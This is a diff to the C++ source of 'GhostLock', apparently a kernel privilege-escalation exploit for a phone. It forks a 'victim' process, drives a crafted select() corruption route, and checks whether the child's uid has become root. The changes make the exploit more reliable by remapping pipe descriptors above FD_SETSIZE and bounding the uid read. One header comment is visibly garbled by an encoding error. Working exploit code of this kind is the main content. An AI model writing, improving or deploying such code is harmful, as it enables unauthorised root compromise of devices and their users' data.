@@ -1,5 +1,5 @@
-/*
- * GhostLock — victim process protocol: spawn, command pipe loop, root handoff.
+﻿/*
+ * GhostLock 鈥?victim process protocol: spawn, command pipe loop, root handoff.
  *
  * Split out of main.cpp; the statement order and log text are unchanged.
  */
@@ -166,14 +166,27 @@ namespace ghostlock::session::victim {
         park_child_process_forever();
     }
 
+    /* Move a victim pipe end above FD_SETSIZE. The select route closes every fd
+     * whose bit is set in its crafted fd_sets (the fake waiter words set many
+     * bits), so long-lived victim fds below 1024 get closed by the route; fds
+     * >= 1024 are invisible to both select() and that cleanup loop. */
+    static int32_t remap_pipe_end_high(int32_t fd) {
+        const int32_t high = fcntl(fd, F_DUPFD, 1024);
+        if (high < 0) return fd;
+        (void) close(fd);
+        return high;
+    }
+
     static pid_t spawn_child(VictimContext &p) {
         std::array<int32_t, 2> p1{}, p2{}, p3{};
         if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
         p.task_read.reset(p1[0]);
         p.task_write.reset(p1[1]);
+        /* Only the parent-side ends need protection: the child's copies are
+         * private to the child and never touched by the route. */
+        p.cmd_write.reset(remap_pipe_end_high(p2[1]));
+        p.uid_read.reset(remap_pipe_end_high(p3[0]));
         p.cmd_read.reset(p2[0]);
-        p.cmd_write.reset(p2[1]);
-        p.uid_read.reset(p3[0]);
         p.uid_write.reset(p3[1]);
         pid_t child = fork();
         if (child < 0) return -1;
@@ -210,11 +223,38 @@ namespace ghostlock::session::victim {
 
     int32_t verify_w2_stage(void *context) {
         auto *stage = static_cast<struct w2_stage_context *>(context);
-        if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) return 0;
+        if (stage->pipes.child() > 0) {
+            int32_t st = 0;
+            pid_t w = waitpid(stage->pipes.child(), &st, WNOHANG);
+            if (w == stage->pipes.child()) {
+                pr_warning("W2 verify: victim already exited status=0x%x\n", st);
+                return 0;
+            }
+        }
+        errno = 0;
+        ssize_t cw = write(stage->pipes.cmd_write.get(), "C", 1);
+        if (cw != 1) {
+            pr_warning("W2 verify: cmd write ret=%zd errno=%d\n", cw, errno);
+            return 0;
+        }
 
         uint32_t child_uid = 9999;
-        if (read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid)) !=
-            static_cast<ssize_t>(sizeof(child_uid))) {
+        /* Bounded non-blocking read: a victim that died after the write would
+         * otherwise park the whole stage (and heat the phone) forever. */
+        const int32_t uid_fd = stage->pipes.uid_read.get();
+        const int32_t flags = fcntl(uid_fd, F_GETFL, 0);
+        if (flags >= 0) (void) fcntl(uid_fd, F_SETFL, flags | O_NONBLOCK);
+        ssize_t nr = -1;
+        for (int32_t i = 0; i < 200; i++) {
+            errno = 0;
+            nr = read(uid_fd, &child_uid, sizeof(child_uid));
+            if (nr == static_cast<ssize_t>(sizeof(child_uid))) break;
+            if (nr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) break;
+            usleep(10000);
+        }
+        if (flags >= 0) (void) fcntl(uid_fd, F_SETFL, flags);
+        if (nr != static_cast<ssize_t>(sizeof(child_uid))) {
+            pr_warning("W2 verify: uid read ret=%zd errno=%d\n", nr, errno);
             return 0;
         }
         pr_info("child uid = %u\n", child_uid);
